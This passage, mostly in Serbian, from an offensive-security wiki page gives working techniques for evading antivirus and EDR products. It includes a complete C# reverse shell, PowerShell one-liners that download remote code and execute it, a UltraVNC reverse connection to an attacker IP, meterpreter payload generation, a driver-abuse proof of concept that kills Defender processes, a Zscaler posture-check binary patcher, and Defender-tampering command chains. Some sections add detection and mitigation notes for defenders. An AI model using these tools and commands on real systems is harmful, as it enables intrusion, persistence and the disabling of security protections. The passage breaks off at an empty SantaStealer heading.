Učitavanje C# binarnih fajlova u memoriju je poznato već duže vreme i i dalje je odličan način za pokretanje vaših post-exploitation alata bez da ih AV otkrije.

Pošto će payload biti učitan direktno u memoriju bez pristupa disku, jedino o čemu treba da brinemo jeste patchovanje AMSI za ceo proces.

Većina C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, itd.) već omogućavaju izvršavanje C# assembly-ja direktno u memoriji, ali postoje različiti pristupi:

- **Fork\&Run**

Obuhvata **pokretanje novog žrtvenog procesa**, injectovanje vašeg post-exploitation malicioznog koda u taj novi proces, izvršavanje koda i po završetku ubijanje tog procesa. Ovo ima svoje prednosti i mane. Prednost Fork and Run metode je što izvršavanje ide **izvan** našeg Beacon implant procesa. To znači da ako nešto pođe po zlu ili bude otkriveno tokom post-exploitation akcije, postoji **značajno veća šansa** da naš **implant preživi.** Mana je što imate **veću šansu** da budete otkriveni od strane **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Radi se o injectovanju post-exploitation malicioznog koda **u sopstveni proces**. Na ovaj način izbegavate kreiranje novog procesa i njegovo skeniranje od strane AV, ali mana je da ako nešto pođe po zlu pri izvršavanju payload-a, postoji **velika šansa** da **izgubite beacon** jer proces može da padne.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ako želite da pročitate više o C# Assembly loading-u, pogledajte ovaj članak [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) i njihov InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Takođe možete učitavati C# Assemblies **iz PowerShell-a**, pogledajte [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) i [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Kao što je predloženo u [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), moguće je izvršavati maliciozni kod koristeći druge jezike tako što se kompromitovanoj mašini omogući pristup **interpreter environment instaliranom na Attacker Controlled SMB share**.

Dozvoljavanjem pristupa Interpreter Binaries i okruženju na SMB share-u možete **izvršavati arbitrary code u tim jezicima unutar memorije** kompromitovane mašine.

Repo navodi: Defender i dalje skenira skripte, ali korišćenjem Go, Java, PHP itd. imamo **više fleksibilnosti da zaobiđemo static signatures**. Testiranje sa nasumičnim ne-obfuskovanim reverse shell skriptama u ovim jezicima je pokazalo uspeh.

## TokenStomping

Token stomping je tehnika koja omogućava napadaču da **manipuliše access token-om ili security product-om poput EDR-a ili AV-a**, dozvoljavajući mu da smanji privilegije tako da proces ne umre, ali nema dozvolu da proverava maliciozne aktivnosti.

Da bi se ovo sprečilo, Windows bi mogao **onemogućiti eksternim procesima** da dobijaju handle-ove nad token-ima security procesa.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Kao što je opisano u [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), lako je deploy-ovati Chrome Remote Desktop na žrtvinom PC-u i zatim ga iskoristiti za takeover i održavanje persistence:
1. Download from https://remotedesktop.google.com/, kliknite na "Set up via SSH", zatim kliknite na MSI fajl za Windows da preuzmete MSI.
2. Pokrenite installer tiho na žrtvi (admin required): `msiexec /i chromeremotedesktophost.msi /qn`
3. Vratite se na Chrome Remote Desktop stranicu i kliknite next. Wizard će tražiti autorizaciju; kliknite Authorize da nastavite.
4. Izvršite dati parametar sa nekim prilagođavanjima: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Obratite pažnju na pin parametar koji omogućava postavljanje pina bez upotrebe GUI-ja).


## Advanced Evasion

Evasion je vrlo komplikovana tema; ponekad morate uzeti u obzir mnoge različite izvore telemetrije unutar jednog sistema, tako da je praktično nemoguće ostati potpuno neotkriven u zrelim okruženjima.

Svako okruženje protiv kojeg idete ima svoje snage i slabosti.

Toplo vam preporučujem da pogledate ovaj talk od [@ATTL4S](https://twitter.com/DaniLJ94), da biste dobili uvod u naprednije Advanced Evasion tehnike.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Ovo je takođe odličan talk od [@mariuszbit](https://twitter.com/mariuszbit) o Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Možete koristiti [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) koji će **uklanjati delove binarnog fajla** dok ne **utvrdi koji deo Defender** smatra malicioznim i podeli vam rezultate.\
Drugi alat koji radi **istu stvar je** [**avred**](https://github.com/dobin/avred) sa otvorenom web uslugom na [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Do Windows10, svi Windows sistemi su dolazili sa **Telnet server-om** koji ste mogli instalirati (kao administrator) radeći:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Neka se **pokrene** pri pokretanju sistema i **pokreni** ga sada:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Promeni telnet port** (stealth) i onemogući firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Preuzmite sa: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (trebate bin downloads, ne setup)

**ON THE HOST**: Pokrenite _**winvnc.exe**_ i konfigurišite server:

- Omogućite opciju _Disable TrayIcon_
- Postavite lozinku u _VNC Password_
- Postavite lozinku u _View-Only Password_

Zatim premestite binarni fajl _**winvnc.exe**_ i **novokreiranu** datoteku _**UltraVNC.ini**_ na **victim**

#### **Reverse connection**

The **attacker** treba da **pokrene unutar** svog **host** binarni fajl `vncviewer.exe -listen 5900` kako bi bio **pripremljen** da presretne reverse **VNC connection**. Zatim, unutar **victim**: pokrenite winvnc daemon `winvnc.exe -run` i izvršite `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**UPOZORENJE:** Da biste održali prikrivenost, ne smete raditi nekoliko stvari

- Ne pokrećite `winvnc` ako već radi ili ćete izazvati [popup](https://i.imgur.com/1SROTTl.png). Proverite da li radi pomoću `tasklist | findstr winvnc`
- Ne pokrećite `winvnc` bez `UltraVNC.ini` u istom direktorijumu jer će se otvoriti [the config window](https://i.imgur.com/rfMQWcf.png)
- Ne pokrećite `winvnc -h` za pomoć jer ćete izazvati [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Preuzmite sa: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Unutar GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Sada **pokrenite lister** sa `msfconsole -r file.rc` i **izvršite** **xml payload** koristeći:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Trenutni Defender će proces vrlo brzo prekinuti.**

### Kompajliranje našeg vlastitog reverse shell-a

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Prvi C# Revershell

Kompajlirajte ga sa:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Koristite ga са:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# using kompajler
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatsko preuzimanje i izvršavanje:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista obfuskatora za C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Primer korišćenja python za build injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Ostali alati
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### More

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Killing AV/EDR From Kernel Space

Storm-2603 je iskoristio mali konzolni alat poznat kao **Antivirus Terminator** da onemogući endpoint zaštite pre nego što je ispustio ransomware. Alat donosi svoj **vlastiti ranjivi ali *signed* driver** i zloupotrebljava ga za izdavanje privilegovanih kernel operacija koje čak i Protected-Process-Light (PPL) AV servisi ne mogu da blokiraju.

Ključni zaključci
1. **Signed driver**: Fajl koji se isporučuje na disk je `ServiceMouse.sys`, ali binarni fajl je legitimno potpisani drajver `AToolsKrnl64.sys` iz Antiy Labs’ “System In-Depth Analysis Toolkit”. Pošto drajver nosi validan Microsoft potpis, učitava se čak i kada je Driver-Signature-Enforcement (DSE) omogućen.
2. **Instalacija servisa**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Prva linija registruje drajver kao **kernel servis**, a druga ga pokreće tako da `\\.\ServiceMouse` postane dostupan iz user land-a.
3. **IOCTL-ovi koje izlaže drajver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Prekine proizvoljan proces po PID-u (upotrebljeno za ubijanje Defender/EDR servisa) |
| `0x990000D0` | Obriše proizvoljan fajl na disku |
| `0x990001D0` | Ukloni drajver iz kernela i obriši servis |

Minimalni C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Zašto ovo radi**: BYOVD u potpunosti zaobilazi user-mode zaštite; kod koji se izvršava u kernelu može da otvori *protected* procese, prekine ih ili manipuliše kernel objektima bez obzira na PPL/PP, ELAM ili druge hardening mehanizme.

Detekcija / Ublažavanje
•  Omogućite Microsoft-ovu listu blokiranih ranjivih drajvera (`HVCI`, `Smart App Control`) tako da Windows odbije učitavanje `AToolsKrnl64.sys`.  
•  Pratite kreiranje novih *kernel* servisa i alertujte kada se drajver učita iz direktorijuma koji je world-writable ili nije na listi dozvoljenih.  
•  Pazite na user-mode handle-ove ka custom device objektima praćene sumnjivim `DeviceIoControl` pozivima.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler’s **Client Connector** primenjuje device-posture pravila lokalno i oslanja se na Windows RPC da komunicira rezultate ka ostalim komponentama. Dva slaba dizajnerska izbora omogućavaju potpuni bypass:

1. Posture evaluation se dešava **potpuno na klijentu** (serveru se šalje boolean).
2. Internal RPC endpoints samo validiraju da je povezani izvršni fajl **potpisan od strane Zscaler** (putem `WinVerifyTrust`).

Patchovanjem četiri signed binarna fajla na disku obe mehanike mogu biti neutralisane:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Uvek vraća `1` pa je svaka provera zadovoljena |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ svaki (čak i unsigned) proces može da se poveže na RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Zamenjena sa `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Zaobijene |

Minimalni izvod patchera:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
After replacing the original files and restarting the service stack:

* **Sve** posture checks prikazuju **green/compliant**.
* Unsigned or modified binaries mogu otvoriti named-pipe RPC endpoints (npr. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Compromised host dobija neograničen pristup internal network definisanom od strane Zscaler policies.

Ova studija slučaja demonstrira kako čisto client-side odluke o poverenju i jednostavne provere potpisa mogu biti poražene sa nekoliko byte patch-eva.

## Zloupotreba Protected Process Light (PPL) za manipulisanje AV/EDR pomoću LOLBINs

Protected Process Light (PPL) nameće signer/level hijerarhiju tako da samo procesi sa istim ili višim zaštićenim nivoom mogu međusobno tamper-ovati. U ofanzivnom smislu, ako možete legitimno pokrenuti PPL-enabled binary i kontrolisati njegove argumente, možete pretvoriti benignu funkcionalnost (npr. logging) u ograničeni, PPL-backed write primitive protiv protected directories koje koriste AV/EDR.

What makes a process run as PPL
- The target EXE (and any loaded DLLs) must be signed with a PPL-capable EKU.
- The process must be created with CreateProcess using the flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- A compatible protection level must be requested that matches the signer of the binary (e.g., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` for anti-malware signers, `PROTECTION_LEVEL_WINDOWS` for Windows signers). Wrong levels will fail at creation.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (selects protection level and forwards arguments to the target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Primer upotrebe:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Potpisani sistemski binarni fajl `C:\Windows\System32\ClipUp.exe` se sam pokreće i prihvata parametar za upis log fajla na putanju koju navede pozivač.
- Kada se pokrene kao PPL proces, upis fajla se izvršava pod PPL zaštitom.
- ClipUp ne može da parsira putanje koje sadrže razmake; koristite 8.3 short paths da pokazujete na normalno zaštićene lokacije.

8.3 short path helpers
- List short names: `dir /x` u svakom roditeljskom direktorijumu.
- Derive short path in cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Pokrenite PPL-capable LOLBIN (ClipUp) sa `CREATE_PROTECTED_PROCESS` koristeći launcher (npr. CreateProcessAsPPL).
2) Prosledite ClipUp log-path argument da prisilite kreiranje fajla u zaštićenom AV direktorijumu (npr. Defender Platform). Koristite 8.3 short names ako je potrebno.
3) Ako je ciljna binarna datoteka obično otvorena/zaključana od strane AV dok radi (npr. MsMpEng.exe), zakažite upis pri boot-u pre nego što AV startuje instaliranjem auto-start servisa koji se pouzdano pokreće ranije. Validirajte redosled boot-a sa Process Monitor (boot logging).
4) Na reboot-u, PPL-podržani upis se desi pre nego što AV zaključa svoje binarne datoteke, korumpirajući ciljnu datoteku i sprečavajući pokretanje.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Beleške i ograničenja
- Ne možete kontrolisati sadržaj koji ClipUp upisuje osim lokacije; ovaj primitiv je prikladan za korupciju, a ne za preciznu injekciju sadržaja.
- Zahteva lokalnog admina/SYSTEM za instalaciju/pokretanje servisa i mogućnost restartovanja.
- Vreme je kritično: cilj ne sme biti otvoren; izvršavanje pri boot-u izbegava zaključavanja fajlova.

Detekcije
- Kreiranje procesa `ClipUp.exe` sa neobičnim argumentima, posebno ako je pokrenut od strane nestandardnih launchera, oko boot-a.
- Novi servisi konfigurisani da automatski pokreću sumnjive binarije i koji se dosledno pokreću pre Defender/AV. Istražiti kreiranje/izmenu servisa pre grešaka pri pokretanju Defender-a.
- Monitoring integriteta fajlova na Defender binarijima/Platform direktorijumima; neočekivana kreiranja/izmene fajlova od procesa sa protected-process zastavicama.
- ETW/EDR telemetrija: tražite procese kreirane sa `CREATE_PROTECTED_PROCESS` i anomalnu upotrebu PPL nivoa od strane binarija koje nisu AV.

Mitigacije
- WDAC/Code Integrity: ograničite koji potpisani binariji mogu da se izvršavaju kao PPL i pod kojim parentima; blokirajte pozive ClipUp izvan legitimnih konteksta.
- Higijena servisa: ograničite kreiranje/izmenu auto-start servisa i nadgledajte manipulacije redosledom pokretanja.
- Osigurajte da su Defender tamper protection i early-launch protections omogućeni; istražite greške pri pokretanju koje ukazuju na korupciju binarija.
- Razmotrite onemogućavanje 8.3 short-name generisanja na volumenima koji hostuju security tooling ako je kompatibilno sa vašim okruženjem (temeljno testirajte).

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender chooses the platform it runs from by enumerating subfolders under:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

It selects the subfolder with the highest lexicographic version string (e.g., `4.18.25070.5-0`), then starts the Defender service processes from there (updating service/registry paths accordingly). This selection trusts directory entries including directory reparse points (symlinks). An administrator can leverage this to redirect Defender to an attacker-writable path and achieve DLL sideloading or service disruption.

Preduslovi
- Lokalni Administrator (potreban za kreiranje direktorijuma/symlinks pod Platform folderom)
- Mogućnost restartovanja ili izazivanja re-selekcije Defender platforme (service restart on boot)
- Potrebni su samo ugrađeni alati (mklink)

Zašto radi
- Defender blokira upise u svoje foldere, ali izbor platforme veruje stavkama direktorijuma i bira leksikografski najveću verziju bez provere da li cilj rezolvuje na zaštićenu/pouzdanu putanju.

Korak po korak (primer)
1) Pripremite upisivu klon trenutnog platform foldera, npr. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Napravite symlink direktorijuma sa višom verzijom unutar Platform koji pokazuje na vaš direktorijum:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Izbor okidača (reboot recommended):
```cmd
shutdown /r /t 0
```
4) Proverite da li se MsMpEng.exe (WinDefend) pokreće iz preusmerene putanje:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Trebalo bi da uočite novu putanju procesa pod `C:\TMP\AV\` i konfiguraciju servisa/podatke u registru koji odražavaju tu lokaciju.

Post-exploitation options
- DLL sideloading/code execution: Postavite/zamenite DLLs koje Defender učitava iz svog direktorijuma aplikacije kako biste izvršili kod u Defenderovim procesima. Pogledajte odeljak iznad: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Uklonite version-symlink tako da pri narednom pokretanju konfigurisana putanja ne može da se reši i Defender neće moći da se pokrene:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Imajte na umu da ova tehnika sama po sebi ne obezbeđuje eskalaciju privilegija; zahteva admin prava.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red timovi mogu premestiti runtime evasion iz C2 implantata u sam ciljani modul tako što će hook-ovati njegov Import Address Table (IAT) i usmeriti odabrane APIs kroz kod pod kontrolom napadača koji je position‑independent (PIC). Ovo generalizuje evaziju izvan malog API površinskog sloja koji mnogi kitovi izlažu (npr. CreateProcessA), i proširuje iste zaštite na BOFs i post‑exploitation DLLs.

Opšti pristup
- Postavite PIC blob pored ciljanog modula koristeći reflective loader (prepended ili companion). PIC mora biti samodostatan i position‑independent.
- Dok se host DLL učitava, pređite kroz njegov IMAGE_IMPORT_DESCRIPTOR i patch-ujte IAT unose za ciljane importe (npr. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) da upućuju na tanke PIC wrapper-e.
- Svaki PIC wrapper izvodi evazije pre nego što tail‑call‑uje pravu adresu API‑ja. Tipične evazije uključuju:
  - Memory mask/unmask oko poziva (npr. šifrovanje beacon regiona, RWX→RX, promena imena/permisiona stranica) i vraćanje nakon poziva.
  - Call‑stack spoofing: konstruisati benigni stack i preći u ciljani API tako da analiza call‑stack‑a rezolvuje očekivane frejmove.
- Za kompatibilnost, eksportujte interfejs tako da Aggressor script (ili ekvivalent) može registrovati koje API‑je hook‑ovati za Beacon, BOFs i post‑ex DLLs.

Zašto IAT hooking ovde
- Radi za bilo koji kod koji koristi hook‑ovani import, bez modifikacije tool koda ili oslanjanja na Beacon da proxuje specifične APIs.
- Pokriva post‑ex DLLs: hook‑ovanjem LoadLibrary* možete presretati učitavanja modula (npr. System.Management.Automation.dll, clr.dll) i primeniti isto maskiranje/stack evasion na njihove API pozive.
- Vraća pouzdano korišćenje komandа za pokretanje procesa u post‑ex scenarijima protiv detekcija zasnovanih na call‑stack‑u umotavanjem CreateProcessA/W.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Beleške
- Primeni patch nakon relocations/ASLR i pre prvog korišćenja importa. Reflective loaders like TitanLdr/AceLdr pokazuju hooking tokom DllMain učitanog modula.
- Drži wrapper-e male i PIC-safe; reši pravi API preko originalne IAT vrednosti koju si uhvatio pre patchovanja ili preko LdrGetProcedureAddress.
- Koristi RW → RX tranzicije za PIC i izbegavaj ostavljanje writable+executable stranica.

Call‑stack spoofing stub
- Draugr‑style PIC stubs prave lažan call chain (return addresses u benign modules) i zatim pivotiraju u pravi API.
- Ovo zaobilazi detekcije koje očekuju canonical stacks iz Beacon/BOFs prema sensitive APIs.
- Upari sa stack cutting/stack stitching tehnikama da dospeš unutar očekivanih frejmova pre API prologa.

Operativna integracija
- Dodaj reflective loader ispred post‑ex DLL-ova tako da se PIC i hooks inicijalizuju automatski kada se DLL učita.
- Koristi Aggressor script da registruješ target APIs tako da Beacon i BOFs transparentno imaju korist od iste evasion path bez izmena koda.

Detekcija/DFIR razmatranja
- IAT integrity: unosi koji se razrešavaju na non‑image (heap/anon) adrese; periodična verifikacija import pointers.
- Stack anomalies: return addresses koje ne pripadaju učitanim image‑ima; nagli prelazi na non‑image PIC; nekonzistentno RtlUserThreadStart poreklo.
- Loader telemetry: upisi u procesu u IAT, rana DllMain aktivnost koja menja import thunks, neočekivane RX regione kreirane pri učitavanju.
- Image‑load evasion: ako se hookuje LoadLibrary*, nadgledaj sumnjive učitke automation/clr assemblies povezane sa memory masking događajima.

Povezani gradivni blokovi i primeri
- Reflective loaders koji izvode IAT patching tokom load‑a (npr., TitanLdr, AceLdr)
- Memory masking hooks (npr., simplehook) i stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (npr., Draugr)

## SantaStealer Tradecraft for Fileless Evasion and Credential Theft

SantaStealer (aka BluelineStealer) ilustruje kako moderni info‑stealers kombinuju AV bypass, anti‑analysis i credential access u jednom workflow‑u.

### Keyboard layout gating & sandbox delay

